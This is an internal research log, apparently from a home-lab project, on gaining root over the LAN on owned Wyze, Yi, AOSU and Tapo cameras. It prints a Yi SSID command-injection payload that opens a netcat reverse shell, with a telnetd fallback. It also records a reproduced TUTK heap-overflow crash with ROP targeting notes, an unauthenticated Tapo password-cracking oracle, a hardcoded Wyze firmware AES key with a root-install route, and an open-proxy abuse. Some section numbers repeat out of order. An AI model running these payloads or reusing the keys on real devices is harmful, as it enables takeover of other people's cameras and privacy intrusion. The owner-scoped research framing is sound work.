# Network-only root and firmware delivery — owner fleet

**Status:** research result, 2026-10-22. Not a qualification claim. Nothing here is release-qualified
and no camera has been reflashed.
**Scope:** owner LAN `Aardvark` (192.168.4.0/22). Owner devices only.
**Constraints:** no disassembly, no UART/soldering, no SD card, no vendor developer program. A
one-time physical **button press** or **app re-provision** is allowed.

This document exists because `DEVICE_ADAPTER_MATRIX.md` §3a/§3b and `fss-provision` encode
"Wyze/AOSU are locked for software, `Transport::None`" as a *charter* decision with no backing
evidence. That is now partly wrong in both directions, and this file records which way.

## 1. Result per family

Two orders are defensible and they differ. This table is ordered **by owner constraint** (least
physical ritual first, mechanism third). The adversarial pack ranks instead by
`(pre-auth x reliability) / (brick risk x physical prerequisite)` — H-008's order is Tapo, Wyze, AOSU,
Yi, and the inversion is deliberate: H-008 weights the one true pre-auth exec path (Tapo) first, while
this table puts the two families whose chains are already reached first.

| Family | Reboot-surviving root over the network? | Binding gate | Evidence |
|---|---|---|---|
| **Yi IPC** | **mechanism only, never fired** — CVE-2018-3910 SSID command injection into `popen("/home/app/cloudAPI … -ssid \"%s\"")` → `sh -c` | one app re-provision onto an attacker AP; no card, no cable | H-006 Y8, Route A (:23-31, :126-152); proving test U1 |
| **AOSU HomeBase** | **open question, and the best remaining candidate** — `FRM_LAN_OTA_START/DATA/FINISH (0x1A/0x1B/0x1C)` is a firmware push *inside* the authenticated LAN session: no cloud, no URL, and (derived, not confirmed) no TLS | whether the LAN frame carries `hmac` (needs `activate.seckey`) or only `md5`; plus one pairing-mode press for `local_key` | pack H-003 §LAN OTA |
| **Wyze Cam v4** | **install-time root only** — OTA fetch is **plain HTTP 80**, MD5-only, and ends in `sh upgraderun.sh` as root, with a **public default AES key** | persistence: **no** script route — `/system` is dm-verity'd, `/configs` is writable but nothing boots from it, and the rootfs has no `fw_setenv` | pack H-002 §3.3/§4.5, H-002c |
| **TP-Link Tapo** | **oracle only on this unit** — it is a **C460 v1.0, fw 1.2.2 Build 260416**, so it is *out of scope for all three new CVEs* (C210 V3.6 / C320WS V2). CVE-2026-102369 applies only to C200 hw v5 / C120 v1. | the admin password. 105814 refuted on this build (34/34 shapes denied); 105810 is built and needs a session; all of it is behind the `stok` gate | H-005b; H-005; H-008 §0/§3a, F-5, F-8; H-010-011 |
| Canary | **no LAN listener** (0/65535 TCP, 0 answering UDP) — but the cloud side is fully interceptable: ARP/DNS/TCP succeed, SNI leaks, TLS aborts `unknown-CA` | trust anchor (cert for `*.canaryis.com`), not reachability | `EV-pack-H-010-011` |
| Owlet | **blocked — not reachable**; 2 032-host discovery + 1 343-port sweep + ARP diff all negative, and no Owlet OUI exists | device presence | `EV-pack-H-010-011` |

## 2. What is dead, and why it matters

`fss`'s device matrix assumed the barrier was *access*. It is not. On Wyze the barrier is
**delivery + a signed boot chain**; on Tapo it is the boot chain alone; on AOSU and Yi it is
**one provisioning action**. Concretely refuted here:

- **No memory-unsafe sink *in the parsers we fuzzed*.** Every case in H-001's malformed matrix —
  discovery size confusion, handshake fragments, record loop, AV/HL lengths — kept the listener
  alive. That is a statement about the TUTK handshake and AV parsers only; §7 records a sink in
  TUTK's own `tutk_packet_Alloc` and an IOCTL handler that takes client-shaped data. CVE-2023-6324 (empty-PSK) is gone; the published RCE
  CVE-2023-6322 was fixed in Jan 2024 and this build is Nov 2025 (SDK `4.3.8.0-…-R2_openssl_Mips_T41_7.2.0`).
  But see §3 for the one thing legacy IOTC *does* still hand out.
- **`K10000` over ~1 KB kills the stream, not the camera** (H-001) — deterministic at 967 B ok / 1047 B
  fatal; a fresh session immediately afterwards streams normally with no reboot. An authenticated
  per-viewer DoS, and the only reliable failure found in the whole AV layer.
- **No pre-auth identity or key oracle on Tuya 3.5** (H-003). 6668 stays silent on GCM failure and closes on
  any `55AA` prefix, so `local_key` recovery is a blind 2^128 search unless obtained out of band.
- **No hidden daemon behind the AOSU proxy** (H-003 §Pivot). 3 025 loopback ports scanned twice: the internally open
  set (`443`, `8888`) is a subset of the externally open set.
- **No state gate on the Yi's dead TCP stack** (H-006 §Unblock test). Port 80 RSTs after WS-Discovery, after 217/217 TNP
  replies, from four source ports and from a source address inside the camera's own /24.
- **No unsigned *recovery-image* path on Wyze** (the SD artifact is `sign-images = firmware`); the
  community method boots a foreign kernel *from* SD instead. U-Boot's
  `verify` defaults ON when unset, and `fit_config_verify_required_keys` only honours key nodes in
  u-boot's **control dtb** carrying `required = "conf"`. The artifact alone cannot show whether that
  node is present (it lives in `mtdblock0`, which no released zip ships); the live boot log does —
  `sha256,rsa2048:kernel-dev+ ... OK` (H-002c:26-31). So the gate is **required-key, every boot**, and
  `kernel-dev` is u-boot's own documented example key name; thingino ships no key material.
- **Legacy UID does not authenticate** (H-001, H-002). `0x0402` and AV login1 are both silent without DTLS, and
  login1 carries the ENR anyway; there is no non-DTLS session path on the v4. UID is inventory only.

### 2b. Wyze OTA — the one chain that could still land

**Resolved: HTTPS only, and no allowlist** (the earlier plain-HTTP line was from the app's own updater,
not `assis`). The chain is url field → `https_download` (`libwyzeUtils:0x2ca28`) →
`https_download_linux_curl` (`0x2c6c0`), which does a bare `strncmp(url,"https",5)` at `0x2c714` and
returns with `upload url is not https %s` before `curl_easy_init`. TLS is `VERIFYPEER=1`,
`VERIFYHOST=2`, `CAINFO=/tmp/cacert.pem` (a boot-time copy of `/system/local/cacert.pem`, the stock
Mozilla bundle), **no pinning**. No host allowlist exists in either the downloader or `assis`.

So the fetch is: our own HTTPS URL, any name we like, chain to a root in that bundle (Let's Encrypt
is in it) — **provided we can make the camera fetch our URL instead of Wyze's.** That is the shadow:
`$aws/things/<id>/shadow/name/wyze-service/update/delta` with the `APPPushOTA` payload. The device
certificate and key are retrievable by their owner through `/device/system/get_iot_certificate`, so an
owner can publish the delta directly. `/tmp/cacert.pem` is writable and re-copied on `iCamera` start,
so a self-signed cert also works *after* a first root — but the first install needs the shadow route.

Remaining mechanics: `/tmp/img`, a **caller-supplied MD5**, decryption, `tar -xvf /tmp/Upgrade.tar`, then `sh /tmp/Upgrade/upgraderun.sh`
**as root**. No TLS, no pinning, and the key is a **compiled default constant**, not a per-unit
secret: `oU8XzEpbOD6pVTLwdz9pxRpN9MGPCo1P` at `libwyzeUtilsPlatform.so` `.rodata 0x6224` in 4.52.17.26 (`0x67cc` in 4.52.9.5332), selected
whenever the provisioned field equals the sentinel `"HLHL"`. `encrypt_type` is **not** caller-supplied
— the push JSON carries only `url`, `md5`, `model` — and `encrypt_type 0` is *not* plaintext: value 1
is AES-256-ECB with padding off, any other value shells out to `encryption` (CBC family, zero IV).
Wrong-mode guesses fail inert (nothing is written). A plaintext tar is accepted only on the
`key[0] == 0` branch, which stock does not take because `product_config_get_ota_app_key` always fills
the buffer.

Consequence: the install path accepts an owner-supplied tar from an owner-chosen HTTPS URL. The trigger
is the only cloud dependency, and the two ways in are (a) spoof the pushed Amazon host **and** hold a
certificate that validates for it — which we cannot mint — or (b) publish the delta ourselves with the
device's IoT credentials. (b) is the real route; (a) only works if Wyze happens to push a host we can
also serve. The documented path shape is `<host>/wuv2/upgrade/<MODEL>/firmware/<ver>.tar`.

The image format is a FIT wrapping an `RKAF` map of exactly `boot` and `system`; the artifact never
carries the bootloader, and the stock script writes to the backup bank only. That is not a guarantee:
`upgraderun.sh` is root, and the CVE-2026-50719 route writes `mtdblock0` — **that write is the one
brick path**. A written-but-unbootable kernel still needs SD/UART. **Boot does a required-key FIT
verify** (`sha256,rsa2048:kernel-dev+`), and `/system` is **dm-verity'd**: `fs_mgr` verifies metadata
against `/verity_key` in the ramdisk and on failure returns *without mounting*, so S18 exits 0, `/configs`
never mounts and no daemon starts — a camera that boots, joins nothing and does nothing. A modified
squashfs without a matching verity blob is a one-way trip, and the root hash is signed.

**There is no script persistence.** `/configs` is rw and exec but nothing boots from it; its only
consumers are `.product_config` (read-only), `upGradeFlag` (deleted at boot) and `.debug_flag` (which
selects a branch that starts *no* daemons). No env tool exists (no `fw_setenv`, no busybox applet), so
`bootargs` — plain text with a CRC32 in the env block — needs a hand-built `dd`. `factorycheck`'s `/tmp/Test/test.sh` route needs an SD/USB `Test.tar`
and that tar is itself signature-checked. So: **install root, not persistent.** Only the env `init=`
edit changes that, and it is unproven twice over: the build may be `CONFIG_ENV_IS_NOWHERE`, and
`/configs` is not mounted at `init=` time so the script must mount `mtdblock4` itself.

## 3. What is usable today

- **Wyze RTSP, on the stock firmware, over the LAN — no app, no cloud, no card.** IOCTRL `0x29e8`
  takes `{"name","pwd","rtspMode"}` and enables the camera's own RTSP server; it persists at
  `/configs/rtsp_config.json` and was replayed independently with ffmpeg (H.264 High 2560x1440@20 +
  AAC). Runbook: `docs/exploit/rtsp-enable.md`; harness method: `docs/WYZE_TUTK_LAB_METHOD.md`.
  This is the shortest path to the owner's actual goal on this family, and it needs no root.
  **Independent re-check, same day:** the command is accepted on `.4.23` and `.5.242` (`0x29e9`,
  `{"result":1,...}` with both stream URLs, repeatedly, for `rtspMode` 1 and 2 and for `fsslab` and
  `admin`), but the listener did **not** come up within 10 s on either unit afterwards — `.5.242`
  opened 554 once, immediately, then closed. So "takes effect immediately" is not reliable here and
  the likely settle path is a reboot after the config is written. Treat "enabled" and "serving" as
  separate states until that is measured.

- **Yi, root shell (mechanism only; U1 in H-006 is the proving test).** SSID payload `x$(nc <host> 4444|sh)` (28 octets, fits the 32-octet field),
  listener `nc -lv 4444`. Fallback `x";telnetd -l/bin/sh;#`. The SSID persists, so the payload
  re-fires on every boot while the camera stays on that AP — persistence by construction. Do not kill
  `rmm` (it is the watchdog's liveness target); kick `/dev/watchdog` from a separate loop.
- **AOSU, unauthenticated open proxy** at `51028` (`tinyproxy/1.11.2`, no `Allow`, no `ConnectPort`)
  with arbitrary egress and a `127.0.0.1` 200-vs-500 port oracle. Not CVE-2023-49606 (1.10.0/1.11.1
  only); in scope for CVE-2025-63938 and CVE-2026-31842, neither RCE.
- **Tapo, offline password verifier.** `POST /` with `encrypt_type:"3"` returns
  `SHA256(cnonce + hash(password) + nonce) + nonce + cnonce` unauthenticated; `cnonce` is
  attacker-chosen, so it is an unmetered verifier over an unsalted, un-stretched hash
  (`[64:80]==nonce`, `[80:96]==cnonce`). ~1.65 M candidates in 6 s — **and it did not hit**: the owner
  password was not recovered, so no Tapo session exists yet.
- **Wyze, complete LAN capture path with no cloud after one inventory** (uid/enr/mac): discovery →
  DTLS 1.2 `ECDHE_PSK_CHACHA20_POLY1305` (identity `AUTHPWD_admin`, PSK `SHA256(ENR)` NUL-zeroed) →
  AV login → frame stream and K-command channel. Independent Python implementation in
  `deliverables/scripts/dtlslib.py`; 592 frames reproduced by the repository client.
- **Wyze, unauthenticated P2P UID disclosure.** Legacy IOTC `0x0601` discovery carries no credential
  and the reply body `[16:36]` is the 20-byte UID verbatim (3/3 units, repeatable). The UID alone
  does not authenticate the NEW protocol, but it is the identity half of every CVE-2023-63xx replay
  class and an inventory seed for a device you have not paired.

## 4. Risk notes that will bite

- Wyze `/configs` (jffs2) is the only persistent writable store and **nothing executes from it**; a
  root shell alone does not survive reboot. SD is the boot hook, which contradicts the "no card" rule.
- U-Boot recovery binds `192.168.0.10` over **wire**; the camera's own Wi-Fi does not work in that
  state. The u-boot env carries the SSID with no Ethernet fallback, and the env is a **single copy
  with no redundancy** — a torn write falls back to the compiled defaults.
- `switch_firmware_with_all_partitions = "no"` leaves the staging partitions in place; blanking them
  (the community `format` step) breaks the *next* stock OTA weeks later.
- Power loss during the boot-time copy leaves a partial main partition; there is no second copy.
- The 2023-12 Tapo brick wave happened because the SD recovery script lives inside the firmware that
  broke. Tapo has no independent recovery.
- **All four Tapo CVEs are model-locked, and UDP 20002 TDP settles it**: this unit is a **C460 v1.0**
  on `1.2.2 Build 260416`, so none of the three new CVEs (C210 V3.6, C320WS V2) apply, and
  CVE-2026-102369 (C200 hw v5 / C120 v1) does not either. A second unit on the same account is a
  C660 v1.6 and gates the same way, so the platform behaviour is uniform. The cert is `CN=TAPO-DEVICE`
  for every model, which is why the wire alone could not say so.
- **The Tapo oracle is better than first measured.** `POST /stok=<anything>/ds` naming a whitelisted
  method returns `-40407` *plus* a fresh nonce, a rotating 512-bit RSA SPKI and a valid
  `device_confirm` computed over an **empty cnonce** — so the verifier consumes no login attempt
  (`time/max_time` untouched) and the 10-attempt budget is not the limit. 1.24e9 candidates were
  exhausted; the 10-digit space was still running when the unit left the segment.
- **105810 is built but unsent.** The overflow is in base64 decoding into a 1024-byte stack buffer; the
  payload is 1 476 base64 chars with `0xbc` confirmed at decoded `0x424` and the command at `0x458`.
  An unauthenticated 4 KB password 401s in 0.4 s without restart, which proves the decode sits behind
  the gate — a session is mandatory.

### AOSU brick contract (rank 2 has none yet, so here it is)

- The A/B commit point is unknown: whether the bootloader validates before switching banks decides
  soft-brick vs reflash-only (H-003:106).
- No factory partition, no evidenced TFTP, and the partition table is confidential — the flash is
  one-way.
- `local_key` changes on re-pair, so a saved key is not durable (H-003:181).
- `CLIENT_LIMT 3` and `ALLOW_NO_KEY_NUM 3` allow three pre-session-key frames per connection, so
  negotiation must be single-shot; exceeding either faults the session (H-003:110).

## 5. Repository defects found on the way

- **Fixed:** `fss-tuya` framed `0x6699` with a 20-byte header and a 16-byte AAD. TuyaOS
  (`lpv35_additional_data_t`, `tuya_protocol.c:486-513`) and tinytuya (`">IHIII"`, AAD `data[4:]`)
  both use **18 bytes with AAD `[4:18]`**. Every 3.5 frame was two bytes long and mis-authenticated;
  `fss-capture-tuya --proto 3.5` could never have opened a session, and the golden fixture had been
  regenerated from the same wrong assumption. Now 21 tests pass, with a header-shape pin.
- `fss-discover` classifies none of the fleet: `.4.37` is the only non-`Unknown` row (Tuya) and the
  three Wyze units and the Yi all come back `Unknown` / `ImportOnly` / `Unavailable`. The brand
  classifier has no TUTK or Wyze lane, and its census cannot see a camera that answers only UDP.

## 6. Next decisive tests

1. **AOSU LAN OTA** — first a 512-byte **wrong-shape** `0x1A` so `retcode 1` names the encoding, then
   the wrong-digest run on the shape that parses. A digest verdict read through the wrong encoding is
   indistinguishable from a parse failure. Digest-checked vs digest-ignored decides whether
   `local_key` alone is enough. This is the whole question.
2. **Wyze shadow publish** — the broker is `aws-iot.wyzecam.com` (CNAME `a24rq1e5m4mtei.iot.us-west-2.amazonaws.com:8883`, real AWS-IoT cert; `test-aws-iot.wyzecam.com` is the staging twin). Device certificate, key and root CA are obtainable: the earlier `404` was an empty `enr`, and the request body is `mac/product_model/product_type/hardware_ver/firmware_ver/enr` plus the literals `sc="verify_method"`, `sv=<access key>`. The broker accepts the device certificate: CONNACK `20 02 00 00` with **client id = thing name** and **SNI = the CNAME target** (the cert is `*.iot.us-west-2.amazonaws.com`, so the friendly name fails hostname verification), and a shadow `update` on `$aws/things/<thing>/shadow/name/wyze-service/update` is PUBACKed. What is still missing is the `reported` schema — the camera writes it, and it is the only source for whether the payload nests under `APPPushOTA`. Owner re-auth is solved end to end (PKCE OAuth,
   email MFA recovered from the Gmail feed; the account now holds a fresh developer-console key pair in
   `~/.config/fss-lab/wyze.env`), the certificate endpoint is located at
   `POST https://app.wyzecam.com/app/v2/device/system/get_iot_certificate` with the right `appid`, and a
   complete key set moves it from `1001 INVALID_PARAMETER` to `2001 access token is error` to
   **`404 NOT_FOUND`** — a lookup miss, so the join field lives in the `cloud_iotCertGet` builder and
   has to be read out of it. Six identity carriers already failed; do not re-brute them.
3. **Wyze dev key** — `key-name-hint = kernel-dev` is baked into U-Boot; without the private key an
   unsigned kernel will not boot and persistence stays closed.
4. **Yi reboot matrix** — ping, WS-Discovery `AppSequence.InstanceId`, port 80, {8080,8000,8899,23},
   TNP, before and after a power cycle. InstanceId changes with 80 still RST proves the ONVIF daemon
   never starts and the advertised `XAddrs` is a static string.

## 7. 2026-10-22 addendum (GrayBadger) — the memory-unsafe sink does exist, in Wyze's own SDK

§2 above says "No memory-unsafe sink on Wyze". That holds for the TUTK handshake/AV parsers as
independently fuzzed, but **not for the TUTK packet allocator**, and the IOCTL layer additionally
accepts client-shaped data:

- **CVE-2026-38698** (public 2026-09-18, pwn2own 2025 Ireland, PoC + report in
  `github.com/vital-information-resource-under-siege/cve-2026-38698-and-cve-2026-38699`):
  authenticated heap overflow in `tutk_packet_Alloc` — the AVPacket header length is forwarded to
  `malloc(param_5+0x24+param_4+param_2)` (≈0x438) and then used as the `memcpy` length. Affected
  TUTK SDK **3.1.10.0 … 4.3.8.1**. The 4.52.17.26 rootfs `bin/iCamera` embeds exactly
  `4.3.8.0-5-gf554f2f-R2_openssl_Mips_T41_7.2.0_v2`, i.e. **4.3.8.0, inside the affected range.**
- **CVE-2026-38699** is the pre-auth sibling: OOB read in `__Fill_ReadBuf` from an unvalidated
  DTLS payload offset (`0x90000000`), reliable crash, no key required.
- The vendor IOCTL table also takes client-shaped data post-auth: cmd **0x284C**
  (`set_mutil_apart_alarm`, entry vaddr `0x8b8b1c`, handler `0x590c3c`, max `0x144`) parses a
  client-declared length through inlined OpenCV. A 7-byte payload `01 00 01 0a 14 1e 28` is accepted
  and persists `apartalarmParm` (observed `type:1 startX:18 longX:56 startY:22 heightY:55`).

Transmission state: the legacy `0x0601` discovery is still answered by 4.52.17.26 and leaks the UID;
the `0x0402` session request is silent (H-001:20-21,36-37), so the stock PoC stalls before
`SSL_connect`.
Replaying its exact 0x540-byte frame (faulty size `0xEEEE` at offset `0x18`) as raw DTLS appdata over
the working `0xCC51` session is accepted but does not crash — the remaining question is the
client→camera AV header/framing, not reachability.

A shell path needing no memory corruption also exists in the binary but is **not yet reachable**:
paracfg user-config item 11 (`telntSwitch`) drives `system("telnetd &")` (apply fn `0x462878`); the
setter for key 11 is unlocated. CVE-2026-38699's "reliable crash" likewise has no in-repo evidence
yet.

Lab tooling: `crates/fss-tutk/examples/session_probe.rs` (`--ioctl`, `--raw-file`, `--k10000-file`,
`--identity`, `--psk-hex`, `--capture-dir`) plus `SessionEvent::Ioctl` for camera→client captures.
Beads/evidence: `~/brennerbot_sessions/fss-camera-liberation-2026-10-22`.

## 8. Sources and reproduction

In-repo: `docs/research/` (packs), `deliverables/scripts/` (probes), `evidence/excerpts/H-005b/` (Tapo
captures + `digest.py`), `docs/exploit/flash-plan.md` (wire-only replacement runbook). External:
the Tapo advisories (`tp-link.com/us/support/faq/5351`, `/5352`) and CVE records; the CVE-2026-38698
PoC repository named in §7; `github.com/kennedn/tapo-onboarding`; `thingino` / `wz_flash-helper`.

Redaction: the probes carry one lab unit's UID/ENR/MAC (`192.168.4.24`, `S3X2…`, `O7y7…`,
`80:48:2C:4B:CF:0B`) as literals. UID/MAC are identifiers; **the ENR is the device secret** — it
authenticates the TUTK session and derives the DTLS PSK, so it is per-unit and not reproducible
elsewhere.

## 5. Live result (GrayBadger, same day) — CVE-2026-38698 reproduces on the v4

The missing piece in §4 was framing. The client→camera AV frame on CC51 is
`[0]=channel 0x07`, `[1]=frame type 0x01`, `u16 pkt_total @12`, `u16 declared payload size @16`, sent as
raw DTLS application data (no HL wrapper, no `0x0c` prefix). With a 1264-byte frame declaring
`0xFFFF` bytes the camera **crashes and reboots in ~8 s**; `0x800` also crashes, `0xEEEE` only stalls
the stream to ~1.4 fps. Two of three attempts crashed, the third never established a session.

Mechanism confirmed in the binary: `tutk_packet_Alloc(payload, len, …)` allocates `0x28 + len` and
`memcpy(len)` from the decrypted payload, and `FUN_0067a0d4` additionally `memcpy`s the tail into a
1280-byte stack buffer. The declared length is never checked against the datagram.

So the Wyze row is no longer "gated on a secret" — it is **gated on a heap spray**, exactly like the
Pan v3 work, except the PoC's tail markers (`0x0095d020`) are Pan-v3 addresses and need v4 values.
The operator path is now `fss-capture-tutk --ioctl 0x284C --payload-file …` (the CLI grew
`--identity/--psk-hex/--encoders/--k10000-file/--ioctl/--payload-file`).

## 6. Corrections and one dead end (GrayBadger, 2026-10-22 later)

**HL version.** The vendor HL head is `"HL" | 0x25 | 0x00 | cmd u16 | len u16 | 8 zero`. Version **5
is only for K-commands (1000x)**; every vendor IOCTRL carries `0x25`. `fss-tutk` now has
`build_ioctl_hl` (0x25) and `build_hl` (5) with tests, and `send_ioctl` routes through the former.
With the corrected header the camera answers `0x284D` on the first send (~100 ms) instead of only
after a retransmit — but the payload is still rejected (`02`), so `02` is a generic result code, not
a verdict on length.

**Generic paracfg setter.** `0x2780` is not in the ioctl table yet the camera accepts it: it is a
generic user-config setter taking the item id in the first payload byte, and it answers `0x2781` with
the applied value. `0x2781` as a command is unhandled (echoes `0x0001`). Setting item 11 flips
`settingParm.telnet` from `2` to `1`, and the value survives a reboot.

**Telnet is not a shell path on this build.** The v4 system rootfs ships **no `/bin/sh`, no busybox
and no `telnetd`** — only `iCamera`, `dmon`, `dnsmasq`, `iotclient` and friends. `system("telnetd &")`
therefore cannot succeed. After setting item 11 and forcing a reboot via the crash primitive, TCP/23
stays closed and a full TCP scan shows only `53/dnsmasq`. Consequences: (a) do not target `system()`
in the ROP, use `exec_shell_sync` (`0x8be960`, `$a0` = command, no `$gp`); (b) any post-exploitation
tooling must be pushed to the device, there is no shell waiting.
